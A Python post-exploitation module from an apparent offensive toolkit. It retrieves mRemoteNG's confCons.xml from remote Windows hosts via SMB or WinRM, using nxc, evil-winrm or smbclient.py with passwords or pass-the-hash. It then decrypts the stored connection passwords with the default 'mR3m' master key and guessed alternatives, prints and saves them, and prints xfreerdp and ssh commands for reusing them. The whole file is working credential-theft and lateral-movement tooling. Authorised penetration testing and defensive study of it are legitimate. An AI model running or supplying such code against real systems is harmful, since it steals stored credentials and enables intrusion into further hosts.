"""
mRemoteNG Credential Extractor
Extracts and decrypts mRemoteNG saved credentials from confCons.xml files.
Supports remote retrieval via SMB or WinRM, and local file parsing.
mRemoteNG uses AES-GCM encryption with a default master password of "mR3m".
"""

import os
import re
import base64
import shlex
from pathlib import Path
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class MRemoteNGCreds(ModuleBase):
    """
    mRemoteNG credential extractor.

    Downloads confCons.xml via SMB or WinRM from a remote target,
    parses the XML for saved connections, and decrypts passwords using
    the mRemoteNG AES-GCM encryption scheme (default key: "mR3m").

    Methods:
    - smb: Use smbclient/impacket-smbclient to download confCons.xml
    - winrm: Use evil-winrm to download confCons.xml
    - local: Parse a local confCons.xml file directly
    """

    # Default paths where mRemoteNG stores confCons.xml on Windows
    DEFAULT_REMOTE_PATHS = [
        r"Users\{user}\AppData\Roaming\mRemoteNG\confCons.xml",
        r"Users\{user}\AppData\Local\mRemoteNG\confCons.xml",
        r"Program Files\mRemoteNG\confCons.xml",
        r"Program Files (x86)\mRemoteNG\confCons.xml",
    ]

    def __init__(self):
        super().__init__()
        self.name = "mremoteng_creds"
        self.description = "Extract and decrypt mRemoteNG saved credentials"
        self.author = "UwU Toolkit"
        self.version = "2.0.0"
        self.module_type = ModuleType.POST
        self.platform = Platform.WINDOWS
        self.tags = ["credentials", "mremoteng", "post-exploitation", "windows", "decrypt", "smb", "winrm"]
        self.references = [
            "https://github.com/haseebT/mRemoteNG-Decrypt",
            "https://github.com/gquere/mRemoteNG_password_decrypt",
        ]

        self.provides = ["credentials"]
        self.consumes = ["credentials"]

        # Connection options
        self.register_option("RHOSTS", "Target IP/hostname", required=True)
        self.register_option("USER", "Username for authentication", default="")
        self.register_option("PASS", "Password for authentication", default="")
        self.register_option("HASHES", "NTLM hash (LM:NT format) for pass-the-hash", default="")
        self.register_option("DOMAIN", "AD domain name", default="")

        # Module-specific options
        self.register_option("CONFCONS_PATH",
                             "Path to confCons.xml (remote path for smb/winrm, local path for local)",
                             default=r"%APPDATA%\mRemoteNG\confCons.xml")
        self.register_option("METHOD", "Retrieval method",
                             default="smb", choices=["smb", "winrm", "local"])
        self.register_option("MASTER_PASSWORD",
                             "Master password for decryption (default: mR3m)",
                             default="mR3m")
        self.register_option("REMOTE_USER",
                             "Windows username whose profile to search (for path expansion)",
                             default="")
        self.register_option("OUTPUT", "Save extracted credentials to file", default="")

    def _derive_key(self, password: str, salt: bytes) -> bytes:
        """Derive AES key from master password using PBKDF2-SHA1."""
        try:
            from Crypto.Protocol.KDF import PBKDF2
            from Crypto.Hash import SHA1
            key = PBKDF2(password, salt, dkLen=32, count=1000, hmac_hash_module=SHA1)
            return key
        except ImportError:
            self.print_error("PyCryptodome not installed. Install with: pip install pycryptodome")
            return None

    def _decrypt_aes_gcm(self, encrypted_data: str, password: str) -> str:
        """Decrypt mRemoteNG password using AES-GCM (mRemoteNG >= 1.76)."""
        try:
            from Crypto.Cipher import AES
            from Crypto.Protocol.KDF import PBKDF2
            from Crypto.Hash import SHA1
        except ImportError:
            self.print_error("PyCryptodome not installed. Install with: pip install pycryptodome")
            return None

        try:
            encrypted_bytes = base64.b64decode(encrypted_data)

            # AES-GCM format: salt(16) + nonce(16) + ciphertext(N) + tag(16)
            if len(encrypted_bytes) < 49:  # 16 + 16 + 1 + 16 minimum
                return self._decrypt_aes_cbc(encrypted_data, password)

            salt = encrypted_bytes[0:16]
            nonce = encrypted_bytes[16:32]
            ciphertext = encrypted_bytes[32:-16]
            tag = encrypted_bytes[-16:]

            key = PBKDF2(password, salt, dkLen=32, count=1000, hmac_hash_module=SHA1)
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
        except Exception:
            return self._decrypt_aes_cbc(encrypted_data, password)

    def _decrypt_aes_cbc(self, encrypted_data: str, password: str) -> str:
        """Fallback: Decrypt mRemoteNG password using AES-CBC (older versions)."""
        try:
            from Crypto.Cipher import AES
            from Crypto.Protocol.KDF import PBKDF2
            from Crypto.Hash import SHA1
        except ImportError:
            return None

        try:
            encrypted_bytes = base64.b64decode(encrypted_data)

            iv = encrypted_bytes[0:16]
            ciphertext = encrypted_bytes[16:]

            salt = b'\x00' * 16
            key = PBKDF2(password, salt, dkLen=32, count=1000, hmac_hash_module=SHA1)

            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)

            # Remove PKCS7 padding
            pad_len = decrypted[-1]
            if 0 < pad_len < 16:
                decrypted = decrypted[:-pad_len]

            return decrypted.decode('utf-8', errors='ignore').rstrip('\x00')
        except Exception:
            return None

    def _parse_config_xml(self, content: str) -> list:
        """Parse mRemoteNG confCons.xml and extract connection info."""
        connections = []

        try:
            attr_pattern = re.compile(r'(\w+)="([^"]*)"')
            node_pattern = re.compile(r'<Node\s+([^>]*)/?>', re.IGNORECASE)

            for match in node_pattern.finditer(content):
                attrs_str = match.group(1)
                attrs = dict(attr_pattern.findall(attrs_str))

                # Skip container nodes (folders)
                if attrs.get('Type') == 'Container':
                    continue

                name = attrs.get('Name', 'Unknown')
                username = attrs.get('Username', '')
                password = attrs.get('Password', '')
                hostname = attrs.get('Hostname', '')
                protocol = attrs.get('Protocol', 'RDP')
                domain = attrs.get('Domain', '')
                port = attrs.get('Port', '')

                if password or hostname:
                    connections.append({
                        'name': name,
                        'username': username,
                        'password': password,
                        'hostname': hostname,
                        'protocol': protocol,
                        'domain': domain,
                        'port': port,
                    })

        except Exception as e:
            self.print_error(f"Error parsing XML: {e}")

        return connections

    def _retrieve_via_smb(self, target, user, password, hashes, domain, remote_path) -> str:
        """Download confCons.xml from target via SMB (C$ share)."""
        self.print_status(f"Retrieving confCons.xml via SMB from {target}...")

        # Determine the remote share and path
        # Convert %APPDATA%\mRemoteNG\confCons.xml to C$\Users\<user>\...
        remote_user = self.get_option("REMOTE_USER") or user

        if '%APPDATA%' in remote_path or '%USERPROFILE%' in remote_path:
            # Expand Windows environment variables to typical paths
            remote_path = remote_path.replace('%APPDATA%',
                                              f'Users\\{remote_user}\\AppData\\Roaming')
            remote_path = remote_path.replace('%USERPROFILE%',
                                              f'Users\\{remote_user}')
            remote_path = remote_path.replace('%LOCALAPPDATA%',
                                              f'Users\\{remote_user}\\AppData\\Local')

        # Normalize path separators for SMB
        smb_path = remote_path.replace('\\', '/')

        # Try to download via smbclient.py (impacket)
        local_tmp = "/tmp/mremoteng_confCons.xml"

        # Build auth string
        if hashes:
            auth = f"{domain + '/' if domain else ''}{user}@{target} -hashes {hashes}"
        else:
            auth = f"{domain + '/' if domain else ''}{user}:{password}@{target}"

        # Try multiple possible locations
        paths_to_try = [smb_path]

        # Also try standard locations if user provided a custom path
        if remote_user:
            for tmpl in self.DEFAULT_REMOTE_PATHS:
                expanded = tmpl.format(user=remote_user).replace('\\', '/')
                if expanded not in paths_to_try:
                    paths_to_try.append(expanded)

        for try_path in paths_to_try:
            self.print_status(f"Trying: C$/{try_path}")

            # Use smbclient.py or smbget
            cmd = (
                f"smbclient.py {shlex.quote(auth)} "
                f"-command 'get C$/{try_path} {local_tmp}'"
            )

            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)

            if ret == 0 and os.path.exists(local_tmp):
                try:
                    with open(local_tmp, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    if '<Connections' in content or '<Node' in content:
                        self.print_good(f"Successfully downloaded confCons.xml from C$/{try_path}")
                        return content
                except Exception:
                    pass

            # Try with nxc/netexec SMB get
            if hashes:
                nxc_auth = f"-u {shlex.quote(user)} -H {shlex.quote(hashes)}"
            else:
                nxc_auth = f"-u {shlex.quote(user)} -p {shlex.quote(password)}"

            if domain:
                nxc_auth += f" -d {shlex.quote(domain)}"

            cmd = (
                f"nxc smb {target} {nxc_auth} "
                f"--get-file 'C$/{try_path}' {local_tmp}"
            )

            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)

            if os.path.exists(local_tmp):
                try:
                    with open(local_tmp, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    if '<Connections' in content or '<Node' in content:
                        self.print_good(f"Successfully downloaded confCons.xml via nxc")
                        return content
                except Exception:
                    pass

        self.print_error("Could not retrieve confCons.xml via SMB")
        return None

    def _retrieve_via_winrm(self, target, user, password, hashes, domain, remote_path) -> str:
        """Download confCons.xml from target via WinRM."""
        self.print_status("Retrieving confCons.xml via WinRM from {}...".format(target))

        if hashes:
            auth = "-u {} -H {}".format(shlex.quote(user), shlex.quote(hashes))
        else:
            auth = "-u {} -p {}".format(shlex.quote(user), shlex.quote(password))

        if domain:
            auth += " -d {}".format(shlex.quote(domain))

        # Build PowerShell script to search common mRemoteNG config locations
        ps_script = (
            '$paths = @('
            '"$env:APPDATA\\mRemoteNG\\confCons.xml",'
            '"$env:LOCALAPPDATA\\mRemoteNG\\confCons.xml",'
            '"C:\\Program Files\\mRemoteNG\\confCons.xml",'
            '"C:\\Program Files (x86)\\mRemoteNG\\confCons.xml"'
            '); foreach($p in $paths){ if(Test-Path $p){ Get-Content $p -Raw; break } }'
        )

        # Try nxc winrm with PowerShell
        cmd = "nxc winrm {} {} -X {}".format(target, auth, shlex.quote(ps_script))
        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)

        if ret == 0 and ('<Connections' in stdout or '<Node' in stdout):
            self.print_good("Successfully retrieved confCons.xml via WinRM (nxc)")
            return stdout

        # Try evil-winrm approach
        if hashes:
            ewrm_auth = "-u {} -H {}".format(shlex.quote(user), shlex.quote(hashes))
        else:
            ewrm_auth = "-u {} -p {}".format(shlex.quote(user), shlex.quote(password))

        ewrm_ps = shlex.quote(ps_script)
        ewrm_cmd = "evil-winrm -i {} {} -c {}".format(target, ewrm_auth, ewrm_ps)

        ret, stdout, stderr = self.run_in_exegol(ewrm_cmd, timeout=30)

        if '<Connections' in stdout or '<Node' in stdout:
            self.print_good("Successfully retrieved confCons.xml via evil-winrm")
            return stdout

        self.print_error("Could not retrieve confCons.xml via WinRM")
        return None

    def _retrieve_local(self, config_path) -> str:
        """Read a local confCons.xml file."""
        # Expand environment variables for local paths
        expanded = os.path.expandvars(config_path)

        if os.path.exists(expanded):
            try:
                with open(expanded, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                self.print_good(f"Read local config file: {expanded}")
                return content
            except Exception as e:
                self.print_error(f"Error reading file: {e}")
                return None

        # Try searching common locations
        import glob
        search_paths = [
            os.path.expandvars(r"%APPDATA%/mRemoteNG/confCons.xml"),
            os.path.expanduser("~/.config/mRemoteNG/confCons.xml"),
        ]

        # Search for any confCons.xml
        home = os.path.expanduser("~")
        for match in glob.glob(os.path.join(home, "**", "confCons.xml"), recursive=True):
            self.print_good(f"Found confCons.xml: {match}")
            try:
                with open(match, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()
            except Exception:
                continue

        self.print_error(f"Config file not found: {expanded}")
        return None

    def run(self) -> bool:
        target = self.get_option("RHOSTS")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        hashes = self.get_option("HASHES")
        domain = self.get_option("DOMAIN")
        config_path = self.get_option("CONFCONS_PATH")
        method = self.get_option("METHOD")
        master_password = self.get_option("MASTER_PASSWORD")
        output_file = self.get_option("OUTPUT")

        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  mRemoteNG Credential Extractor")
        self.print_good("=" * 60)
        self.print_status(f"Target: {target}")
        self.print_status(f"Method: {method}")
        self.print_status(f"Master Password: {master_password}")
        if user:
            self.print_status(f"Auth User: {user}")
        self.print_line()

        # Retrieve confCons.xml content based on method
        config_content = None

        if method == "smb":
            if not user:
                self.print_error("USER option is required for SMB method")
                return False
            if not password and not hashes:
                self.print_error("PASS or HASHES option is required for SMB method")
                return False
            config_content = self._retrieve_via_smb(target, user, password, hashes, domain, config_path)

        elif method == "winrm":
            if not user:
                self.print_error("USER option is required for WinRM method")
                return False
            if not password and not hashes:
                self.print_error("PASS or HASHES option is required for WinRM method")
                return False
            config_content = self._retrieve_via_winrm(target, user, password, hashes, domain, config_path)

        elif method == "local":
            config_content = self._retrieve_local(config_path)

        if not config_content:
            self.print_error("No confCons.xml content retrieved")
            self.print_status("Common locations to check:")
            self.print_status(r"  - %APPDATA%\mRemoteNG\confCons.xml")
            self.print_status(r"  - C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml")
            return False

        # Parse connections from XML
        self.print_status("Parsing confCons.xml...")
        connections = self._parse_config_xml(config_content)

        if not connections:
            self.print_warning("No connections found in confCons.xml")
            return False

        self.print_good(f"Found {len(connections)} connection(s)")
        self.print_line()

        # Try multiple master passwords for decryption
        passwords_to_try = [master_password]
        if master_password != "mR3m":
            passwords_to_try.append("mR3m")
        passwords_to_try.extend(["", "password", "admin", "mremoteng"])

        credentials_found = []

        for conn in connections:
            self.print_status(f"Connection: {conn['name']}")
            self.print_status(f"  Hostname: {conn['hostname']}")
            self.print_status(f"  Protocol: {conn['protocol']}")
            self.print_status(f"  Username: {conn['username']}")
            if conn['domain']:
                self.print_status(f"  Domain: {conn['domain']}")
            if conn['port']:
                self.print_status(f"  Port: {conn['port']}")

            if conn['password']:
                decrypted = None
                used_password = None

                for pwd in passwords_to_try:
                    result = self._decrypt_aes_gcm(conn['password'], pwd)
                    if result:
                        decrypted = result
                        used_password = pwd
                        break

                if decrypted:
                    self.print_good(f"  Password: {decrypted}")
                    if used_password:
                        self.print_status(f"  (Decrypted with master password: '{used_password}')")

                    credentials_found.append({
                        'name': conn['name'],
                        'hostname': conn['hostname'],
                        'username': conn['username'],
                        'password': decrypted,
                        'protocol': conn['protocol'],
                        'domain': conn['domain'],
                        'port': conn['port'],
                    })
                else:
                    self.print_warning(f"  Password: [ENCRYPTED - Could not decrypt]")
                    self.print_status(f"  Raw: {conn['password'][:50]}...")
            else:
                self.print_status("  Password: [EMPTY]")

            self.print_line()

        # Display summary
        if credentials_found:
            self.print_good("=" * 60)
            self.print_good("DECRYPTED CREDENTIALS SUMMARY")
            self.print_good("=" * 60)
            self.print_line()

            self.print_line(f"{'Hostname':<25} {'Protocol':<8} {'Username':<20} {'Password':<30}")
            self.print_line("-" * 83)

            for cred in credentials_found:
                domain_str = f"{cred['domain']}\\" if cred['domain'] else ""
                self.print_good(
                    f"{cred['hostname']:<25} "
                    f"{cred['protocol']:<8} "
                    f"{domain_str}{cred['username']:<20} "
                    f"{cred['password']:<30}"
                )

            self.print_line()
            self.print_status("Usage hints:")
            for cred in credentials_found:
                domain_str = f"/d:{cred['domain']} " if cred['domain'] else ""
                if cred['protocol'].upper() == 'RDP':
                    self.print_status(
                        f"  xfreerdp /v:{cred['hostname']} /u:{cred['username']} "
                        f"/p:'{cred['password']}' {domain_str}/cert:ignore"
                    )
                elif cred['protocol'].upper() in ('SSH1', 'SSH2'):
                    self.print_status(f"  ssh {cred['username']}@{cred['hostname']}")
                elif cred['protocol'].upper() == 'TELNET':
                    self.print_status(f"  telnet {cred['hostname']}")

            # Save to file if OUTPUT is set
            if output_file:
                try:
                    with open(output_file, 'w') as f:
                        f.write("# mRemoteNG Extracted Credentials\n")
                        f.write(f"# Source: {target}\n\n")
                        for cred in credentials_found:
                            domain_str = f"{cred['domain']}\\" if cred['domain'] else ""
                            f.write(
                                f"{cred['hostname']}\t{cred['protocol']}\t"
                                f"{domain_str}{cred['username']}\t{cred['password']}\n"
                            )
                    self.print_line()
                    self.print_good(f"Credentials saved to: {output_file}")
                except Exception as e:
                    self.print_error(f"Could not save to file: {e}")

            return True
        else:
            self.print_warning("No credentials could be decrypted")
            self.print_status("Try specifying a different MASTER_PASSWORD")
            return False

    def check(self) -> bool:
        """Verify required tools are available."""
        method = self.get_option("METHOD") or "smb"

        # Check PyCryptodome for decryption
        try:
            from Crypto.Cipher import AES
            from Crypto.Protocol.KDF import PBKDF2
            self.print_good("PyCryptodome available for decryption")
        except ImportError:
            # Check in Exegol
            ret, stdout, _ = self.run_in_exegol(
                "python3 -c 'from Crypto.Cipher import AES; print(\"OK\")'", timeout=10
            )
            if ret != 0 or 'OK' not in stdout:
                self.print_error("PyCryptodome not available. Install with: pip install pycryptodome")
                return False
            self.print_good("PyCryptodome available in Exegol")

        if method == "local":
            self.print_good("Local mode - no additional tools needed")
            return True

        if method == "smb":
            # Check for smbclient.py or nxc
            for tool in ["smbclient.py", "nxc", "netexec"]:
                if find_tool(tool):
                    self.print_good(f"{tool} found for SMB retrieval")
                    return True
                ret, stdout, _ = self.run_in_exegol(f"which {tool}", timeout=10)
                if ret == 0 and stdout.strip():
                    self.print_good(f"{tool} found in Exegol for SMB retrieval")
                    return True
            self.print_error("No SMB tool found (need smbclient.py or nxc)")
            return False

        if method == "winrm":
            for tool in ["evil-winrm", "nxc", "netexec"]:
                if find_tool(tool):
                    self.print_good(f"{tool} found for WinRM retrieval")
                    return True
                ret, stdout, _ = self.run_in_exegol(f"which {tool}", timeout=10)
                if ret == 0 and stdout.strip():
                    self.print_good(f"{tool} found in Exegol for WinRM retrieval")
                    return True
            self.print_error("No WinRM tool found (need evil-winrm or nxc)")
            return False

        return True


def register_module():
    return MRemoteNGCreds()
